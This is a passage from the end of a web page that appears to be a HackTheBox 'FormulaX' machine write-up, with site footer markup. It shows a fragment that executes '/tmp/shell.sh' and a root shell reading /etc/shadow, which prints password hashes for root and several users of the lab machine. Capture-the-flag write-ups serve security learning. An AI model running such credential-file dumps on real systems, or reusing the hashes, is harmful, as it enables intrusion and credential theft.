class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/tmp/shell.sh&quot;</span>, 1)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T$/lSSkn2dpkUFYRVCTUSn5.<span class="variable">$XhIP3</span>.CfCv2pusU6c4TPVgRsCedfulJNgnBbPfWXLO8:19752:0:99999:7:::</span><br><span class="line">daemon:*:19405:0:99999:7:::</span><br><span class="line">bin:*:19405:0:99999:7:::</span><br><span class="line">sys:*:19405:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19405:0:99999:7:::</span><br><span class="line">games:*:19405:0:99999:7:::</span><br><span class="line">man:*:19405:0:99999:7:::</span><br><span class="line">lp:*:19405:0:99999:7:::</span><br><span class="line">mail:*:19405:0:99999:7:::</span><br><span class="line">news:*:19405:0:99999:7:::</span><br><span class="line">uucp:*:19405:0:99999:7:::</span><br><span class="line">proxy:*:19405:0:99999:7:::</span><br><span class="line">www-data:*:19405:0:99999:7:::</span><br><span class="line">backup:*:19405:0:99999:7:::</span><br><span class="line">list:*:19405:0:99999:7:::</span><br><span class="line">irc:*:19405:0:99999:7:::</span><br><span class="line">gnats:*:19405:0:99999:7:::</span><br><span class="line">nobody:*:19405:0:99999:7:::</span><br><span class="line">_apt:*:19405:0:99999:7:::</span><br><span class="line">systemd-network:*:19405:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19405:0:99999:7:::</span><br><span class="line">messagebus:*:19405:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19405:0:99999:7:::</span><br><span class="line">pollinate:*:19405:0:99999:7:::</span><br><span class="line">sshd:*:19405:0:99999:7:::</span><br><span class="line">usbmux:*:19515:0:99999:7:::</span><br><span class="line">mongodb:*:19515:0:99999:7:::</span><br><span class="line">snapd-range-524288-root:!:19516::::::</span><br><span class="line">snap_daemon:!:19516::::::</span><br><span class="line">mysql:!:19523:0:99999:7:::</span><br><span class="line">Debian-snmp:!:19523:0:99999:7:::</span><br><span class="line">librenms:$y$j9T<span class="variable">$a6ohQusJVAmNjlckw53IW</span>.<span class="variable">$nU2wJkIRb3bFK9apCdGWMG3ZMcBAujBdpQXl2rUbh53</span>:19523::::::</span><br><span class="line">tcpdump:*:19524:0:99999:7:::</span><br><span class="line">kai_relay:$y$j9T<span class="variable">$tOkGbctwaNrLGuhDtJz</span>/k0<span class="variable">$1UiJF6TE5k9sh0uEGM3s7Emp</span>/TEAQNmQXfaisdNnuH2:19607:0:99999:7:::</span><br><span class="line">frank_dorky:$y$j9T<span class="variable">$lhs</span>.tsQJeDgpGhN7IBjaa1<span class="variable">$eND3</span>/hQVaoF27lyz28/TGQTsCcEnHO0eoOXwt4LCME.:19607:0:99999:7:::</span><br><span class="line">_laurel:!:19773::::::</span><br></pre></td></tr></table></figure>
+<p>‍</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p>如果你是新手，使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&text=HackTheBox - Machine - FormulaX"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&title=HackTheBox - Machine - FormulaX"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&is_video=false&description=HackTheBox - Machine - FormulaX"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - FormulaX&body=Check out this article: https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&title=HackTheBox - Machine - FormulaX"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&title=HackTheBox - Machine - FormulaX"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&title=HackTheBox - Machine - FormulaX"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&title=HackTheBox - Machine - FormulaX"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&name=HackTheBox - Machine - FormulaX&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&t=HackTheBox - Machine - FormulaX"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
